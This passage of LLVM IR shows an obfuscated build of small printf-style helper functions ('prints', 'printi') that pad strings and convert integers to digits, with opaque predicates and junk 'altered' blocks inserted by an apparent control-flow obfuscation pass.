  %gen37 = mul i32 %_36, 8
  %_38 = sub i32 %256, 8
  %gen39 = mul i32 %_38, 8
  %_40 = shl i32 %256, 8
  %_41 = sub i32 0, %256
  %gen42 = add i32 %_41, 8
  %_43 = shl i32 %256, 8
  %_44 = sub i32 0, %256
  %gen45 = add i32 %_44, 8
  %667 = add i32 %256, 8
  store i32 %667, i32* %255, align 8
  br label %originalBB33

originalBB49alteredBB:                            ; preds = %originalBB49, %280
  %668 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %254, i32 0, i32 2
  %669 = load i8*, i8** %668, align 8
  %670 = bitcast i8* %669 to i32*
  %671 = getelementptr i8, i8* %669, i32 8
  store i8* %671, i8** %668, align 8
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %309
  %672 = load i8*, i8** %5, align 8
  %673 = load i8, i8* %672, align 1
  %674 = zext i8 %673 to i32
  %675 = icmp eq i32 %674, 120
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %330
  %676 = load i8**, i8*** %4, align 8
  %677 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %678 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 8
  %680 = icmp ule i32 %679, 40
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %401
  %681 = load i8*, i8** %5, align 8
  %682 = load i8, i8* %681, align 1
  %683 = zext i8 %682 to i32
  %684 = icmp eq i32 %683, 117
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %428
  %685 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 3
  %686 = load i8*, i8** %685, align 8
  %687 = getelementptr i8, i8* %686, i32 %426
  %688 = bitcast i8* %687 to i32*
  %689 = add i32 %426, 8
  store i32 %689, i32* %425, align 8
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %468
  %690 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %691 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %690, i32 0, i32 0
  %692 = load i32, i32* %691, align 8
  %693 = icmp ule i32 %692, 40
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %495
  %694 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %477, i32 0, i32 2
  %695 = load i8*, i8** %694, align 8
  %696 = bitcast i8* %695 to i32*
  %697 = getelementptr i8, i8* %695, i32 8
  store i8* %697, i8** %694, align 8
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %516
  %698 = load i32, i32* %517, align 4
  %699 = trunc i32 %698 to i8
  %700 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %699, i8* %700, align 1
  %701 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %701, align 1
  %702 = load i8**, i8*** %4, align 8
  %703 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %704 = load i32, i32* %7, align 4
  %705 = load i32, i32* %8, align 4
  %706 = call i32 @prints(i8** %702, i8* %703, i32 %704, i32 %705)
  %707 = load i32, i32* %9, align 4
  %_78 = sub i32 0, %707
  %gen79 = add i32 %_78, %706
  %_80 = sub i32 0, %707
  %gen81 = add i32 %_80, %706
  %_82 = shl i32 %707, %706
  %708 = add nsw i32 %707, %706
  store i32 %708, i32* %9, align 4
  br label %originalBB77

originalBB86alteredBB:                            ; preds = %originalBB86, %545
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %562
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %579
  %709 = load i8**, i8*** %4, align 8
  %710 = load i8*, i8** %5, align 8
  %711 = load i8, i8* %710, align 1
  %712 = zext i8 %711 to i32
  call void @printchar(i8** %709, i32 %712)
  %713 = load i32, i32* %9, align 4
  %_95 = sub i32 0, %713
  %gen96 = add i32 %_95, 1
  %_97 = sub i32 0, %713
  %gen98 = add i32 %_97, 1
  %714 = add nsw i32 %713, 1
  store i32 %714, i32* %9, align 4
  br label %originalBB94

originalBB102alteredBB:                           ; preds = %originalBB102, %609
  %715 = load i8**, i8*** %4, align 8
  %716 = load i8*, i8** %715, align 8
  store i8 0, i8* %716, align 1
  br label %originalBB102
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.13
  %6 = load i32, i32* @y.14
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.13
  %24 = load i32, i32* @y.14
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %90

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %19, align 4
  %32 = load i8*, i8** %14, align 8
  store i8* %32, i8** %20, align 8
  br label %33

; <label>:33:                                     ; preds = %56, %31
  %34 = load i8*, i8** %20, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %59

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.13
  %39 = load i32, i32* @y.14
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %19, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %19, align 4
  %48 = load i32, i32* @x.13
  %49 = load i32, i32* @y.14
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %56

; <label>:56:                                     ; preds = %originalBBpart29
  %57 = load i8*, i8** %20, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %20, align 8
  br label %33

; <label>:59:                                     ; preds = %33
  %60 = load i32, i32* @x.13
  %61 = load i32, i32* @y.14
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %59
  %68 = load i32, i32* %19, align 4
  %69 = load i32, i32* %15, align 4
  %70 = icmp sge i32 %68, %69
  %71 = load i32, i32* @x.13
  %72 = load i32, i32* @y.14
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %70, label %79, label %80

; <label>:79:                                     ; preds = %originalBBpart213
  store i32 0, i32* %15, align 4
  br label %84

; <label>:80:                                     ; preds = %originalBBpart213
  %81 = load i32, i32* %19, align 4
  %82 = load i32, i32* %15, align 4
  %83 = sub nsw i32 %82, %81
  store i32 %83, i32* %15, align 4
  br label %84

; <label>:84:                                     ; preds = %80, %79
  %85 = load i32, i32* %16, align 4
  %86 = and i32 %85, 2
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %84
  store i32 48, i32* %18, align 4
  br label %89

; <label>:89:                                     ; preds = %88, %84
  br label %90

; <label>:90:                                     ; preds = %89, %originalBBpart2
  %91 = load i32, i32* @x.13
  %92 = load i32, i32* @y.14
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %90
  %99 = load i32, i32* %16, align 4
  %100 = and i32 %99, 1
  %101 = icmp ne i32 %100, 0
  %102 = load i32, i32* @x.13
  %103 = load i32, i32* @y.14
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart226, label %originalBB15alteredBB

originalBBpart226:                                ; preds = %originalBB15
  br i1 %101, label %139, label %110

; <label>:110:                                    ; preds = %originalBBpart226
  br label %111

; <label>:111:                                    ; preds = %119, %110
  %112 = load i32, i32* %15, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %111
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %18, align 4
  call void @printchar(i8** %115, i32 %116)
  %117 = load i32, i32* %17, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %17, align 4
  br label %119

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %15, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %15, align 4
  br label %111

; <label>:122:                                    ; preds = %111
  %123 = load i32, i32* @x.13
  %124 = load i32, i32* @y.14
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %122
  %131 = load i32, i32* @x.13
  %132 = load i32, i32* @y.14
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %139

; <label>:139:                                    ; preds = %originalBBpart230, %originalBBpart226
  %140 = load i32, i32* @x.13
  %141 = load i32, i32* @y.14
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %139
  %148 = load i32, i32* @x.13
  %149 = load i32, i32* @y.14
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %156

; <label>:156:                                    ; preds = %originalBBpart242, %originalBBpart234
  %157 = load i32, i32* @x.13
  %158 = load i32, i32* @y.14
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %156
  %165 = load i8*, i8** %14, align 8
  %166 = load i8, i8* %165, align 1
  %167 = icmp ne i8 %166, 0
  %168 = load i32, i32* @x.13
  %169 = load i32, i32* @y.14
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %167, label %176, label %202

; <label>:176:                                    ; preds = %originalBBpart238
  %177 = load i8**, i8*** %13, align 8
  %178 = load i8*, i8** %14, align 8
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  call void @printchar(i8** %177, i32 %180)
  %181 = load i32, i32* %17, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %17, align 4
  br label %183

; <label>:183:                                    ; preds = %176
  %184 = load i32, i32* @x.13
  %185 = load i32, i32* @y.14
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %183
  %192 = load i8*, i8** %14, align 8
  %193 = getelementptr inbounds i8, i8* %192, i32 1
  store i8* %193, i8** %14, align 8
  %194 = load i32, i32* @x.13
  %195 = load i32, i32* @y.14
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %156

; <label>:202:                                    ; preds = %originalBBpart238
  br label %203

; <label>:203:                                    ; preds = %211, %202
  %204 = load i32, i32* %15, align 4
  %205 = icmp sgt i32 %204, 0
  br i1 %205, label %206, label %214

; <label>:206:                                    ; preds = %203
  %207 = load i8**, i8*** %13, align 8
  %208 = load i32, i32* %18, align 4
  call void @printchar(i8** %207, i32 %208)
  %209 = load i32, i32* %17, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %17, align 4
  br label %211

; <label>:211:                                    ; preds = %206
  %212 = load i32, i32* %15, align 4
  %213 = add nsw i32 %212, -1
  store i32 %213, i32* %15, align 4
  br label %203

; <label>:214:                                    ; preds = %203
  %215 = load i32, i32* %17, align 4
  ret i32 %215

originalBBalteredBB:                              ; preds = %originalBB, %4
  %216 = alloca i8**, align 8
  %217 = alloca i8*, align 8
  %218 = alloca i32, align 4
  %219 = alloca i32, align 4
  %220 = alloca i32, align 4
  %221 = alloca i32, align 4
  %222 = alloca i32, align 4
  %223 = alloca i8*, align 8
  store i8** %0, i8*** %216, align 8
  store i8* %1, i8** %217, align 8
  store i32 %2, i32* %218, align 4
  store i32 %3, i32* %219, align 4
  store i32 0, i32* %220, align 4
  store i32 32, i32* %221, align 4
  %224 = load i32, i32* %218, align 4
  %225 = icmp sgt i32 %224, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %226 = load i32, i32* %19, align 4
  %_ = sub i32 %226, 1
  %gen = mul i32 %_, 1
  %_2 = shl i32 %226, 1
  %_3 = sub i32 %226, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %226, 1
  %_6 = sub i32 %226, 1
  %gen7 = mul i32 %_6, 1
  %227 = add nsw i32 %226, 1
  store i32 %227, i32* %19, align 4
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %59
  %228 = load i32, i32* %19, align 4
  %229 = load i32, i32* %15, align 4
  %230 = icmp sge i32 %228, %229
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %90
  %231 = load i32, i32* %16, align 4
  %_16 = sub i32 %231, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 %231, 1
  %gen19 = mul i32 %_18, 1
  %_20 = sub i32 0, %231
  %gen21 = add i32 %_20, 1
  %_22 = sub i32 %231, 1
  %gen23 = mul i32 %_22, 1
  %_24 = shl i32 %231, 1
  %232 = and i32 %231, 1
  %233 = icmp ne i32 %232, 0
  br label %originalBB15

originalBB28alteredBB:                            ; preds = %originalBB28, %122
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %139
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %156
  %234 = load i8*, i8** %14, align 8
  %235 = load i8, i8* %234, align 1
  %236 = icmp ne i8 %235, 0
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %183
  %237 = load i8*, i8** %14, align 8
  %238 = getelementptr inbounds i8, i8* %237, i32 1
  store i8* %238, i8** %14, align 8
  br label %originalBB40
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %49

; <label>:25:                                     ; preds = %7
  %26 = load i32, i32* @x.15
  %27 = load i32, i32* @y.16
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %34 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %34, align 1
  %35 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %35, align 1
  %36 = load i8**, i8*** %9, align 8
  %37 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %38 = load i32, i32* %13, align 4
  %39 = load i32, i32* %14, align 4
  %40 = call i32 @prints(i8** %36, i8* %37, i32 %38, i32 %39)
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* @x.15
  %42 = load i32, i32* @y.16
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %214

; <label>:49:                                     ; preds = %7
  %50 = load i32, i32* %12, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %61

; <label>:52:                                     ; preds = %49
  %53 = load i32, i32* %11, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %61

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %10, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %55
  store i32 1, i32* %19, align 4
  %59 = load i32, i32* %10, align 4
  %60 = sub nsw i32 0, %59
  store i32 %60, i32* %21, align 4
  br label %61

; <label>:61:                                     ; preds = %58, %55, %52, %49
  %62 = load i32, i32* @x.15
  %63 = load i32, i32* @y.16
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %71 = getelementptr inbounds i8, i8* %70, i64 12
  %72 = getelementptr inbounds i8, i8* %71, i64 -1
  store i8* %72, i8** %17, align 8
  %73 = load i8*, i8** %17, align 8
  store i8 0, i8* %73, align 1
  %74 = load i32, i32* @x.15
  %75 = load i32, i32* @y.16
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart243, %originalBBpart24
  %83 = load i32, i32* %21, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %154

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* @x.15
  %87 = load i32, i32* @y.16
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* %21, align 4
  %95 = load i32, i32* %11, align 4
  %96 = urem i32 %94, %95
  store i32 %96, i32* %18, align 4
  %97 = load i32, i32* %18, align 4
  %98 = icmp sge i32 %97, 10
  %99 = load i32, i32* @x.15
  %100 = load i32, i32* @y.16
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart212, label %originalBB6alteredBB

originalBBpart212:                                ; preds = %originalBB6
  br i1 %98, label %107, label %129

; <label>:107:                                    ; preds = %originalBBpart212
  %108 = load i32, i32* @x.15
  %109 = load i32, i32* @y.16
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %107
  %116 = load i32, i32* %15, align 4
  %117 = sub nsw i32 %116, 48
  %118 = sub nsw i32 %117, 10
  %119 = load i32, i32* %18, align 4
  %120 = add nsw i32 %119, %118
  store i32 %120, i32* %18, align 4
  %121 = load i32, i32* @x.15
  %122 = load i32, i32* @y.16
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart227, label %originalBB14alteredBB

originalBBpart227:                                ; preds = %originalBB14
  br label %129

; <label>:129:                                    ; preds = %originalBBpart227, %originalBBpart212
  %130 = load i32, i32* @x.15
  %131 = load i32, i32* @y.16
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %129
  %138 = load i32, i32* %18, align 4
  %139 = add nsw i32 %138, 48
  %140 = trunc i32 %139 to i8
  %141 = load i8*, i8** %17, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 -1
  store i8* %142, i8** %17, align 8
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %11, align 4
  %144 = load i32, i32* %21, align 4
  %145 = udiv i32 %144, %143
  store i32 %145, i32* %21, align 4
  %146 = load i32, i32* @x.15
  %147 = load i32, i32* @y.16
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart243, label %originalBB29alteredBB

originalBBpart243:                                ; preds = %originalBB29
  br label %82

; <label>:154:                                    ; preds = %82
  %155 = load i32, i32* %19, align 4
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %157, label %206

; <label>:157:                                    ; preds = %154
  %158 = load i32, i32* %13, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %202

; <label>:160:                                    ; preds = %157
  %161 = load i32, i32* @x.15
  %162 = load i32, i32* @y.16
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %160
  %169 = load i32, i32* %14, align 4
  %170 = and i32 %169, 2
  %171 = icmp ne i32 %170, 0
  %172 = load i32, i32* @x.15
  %173 = load i32, i32* @y.16
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart255, label %originalBB45alteredBB

originalBBpart255:                                ; preds = %originalBB45
  br i1 %171, label %180, label %202

; <label>:180:                                    ; preds = %originalBBpart255
  %181 = load i32, i32* @x.15
  %182 = load i32, i32* @y.16
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %180
  %189 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %189, i32 45)
  %190 = load i32, i32* %20, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %20, align 4
  %192 = load i32, i32* %13, align 4
  %193 = add nsw i32 %192, -1
  store i32 %193, i32* %13, align 4
  %194 = load i32, i32* @x.15
  %195 = load i32, i32* @y.16
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart275, label %originalBB57alteredBB

originalBBpart275:                                ; preds = %originalBB57
  br label %205

; <label>:202:                                    ; preds = %originalBBpart255, %157
  %203 = load i8*, i8** %17, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 -1
  store i8* %204, i8** %17, align 8
  store i8 45, i8* %204, align 1
  br label %205

; <label>:205:                                    ; preds = %202, %originalBBpart275
  br label %206

; <label>:206:                                    ; preds = %205, %154
  %207 = load i32, i32* %20, align 4
  %208 = load i8**, i8*** %9, align 8
  %209 = load i8*, i8** %17, align 8
  %210 = load i32, i32* %13, align 4
  %211 = load i32, i32* %14, align 4
  %212 = call i32 @prints(i8** %208, i8* %209, i32 %210, i32 %211)
  %213 = add nsw i32 %207, %212
  store i32 %213, i32* %8, align 4
  br label %214

; <label>:214:                                    ; preds = %206, %originalBBpart2
  %215 = load i32, i32* %8, align 4
  ret i32 %215

originalBBalteredBB:                              ; preds = %originalBB, %25
  %216 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %216, align 1
  %217 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %217, align 1
  %218 = load i8**, i8*** %9, align 8
  %219 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %220 = load i32, i32* %13, align 4
  %221 = load i32, i32* %14, align 4
  %222 = call i32 @prints(i8** %218, i8* %219, i32 %220, i32 %221)
  store i32 %222, i32* %8, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %223 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %224 = getelementptr inbounds i8, i8* %223, i64 12
  %225 = getelementptr inbounds i8, i8* %224, i64 -1
  store i8* %225, i8** %17, align 8
  %226 = load i8*, i8** %17, align 8
  store i8 0, i8* %226, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %227 = load i32, i32* %21, align 4
  %228 = load i32, i32* %11, align 4
  %_ = sub i32 %227, %228
  %gen = mul i32 %_, %228
  %_7 = sub i32 %227, %228
  %gen8 = mul i32 %_7, %228
  %_9 = sub i32 %227, %228
  %gen10 = mul i32 %_9, %228
  %229 = urem i32 %227, %228
  store i32 %229, i32* %18, align 4
  %230 = load i32, i32* %18, align 4
  %231 = icmp sge i32 %230, 10
  br label %originalBB6

originalBB14alteredBB:                            ; preds = %originalBB14, %107
  %232 = load i32, i32* %15, align 4
  %_15 = sub i32 0, %232
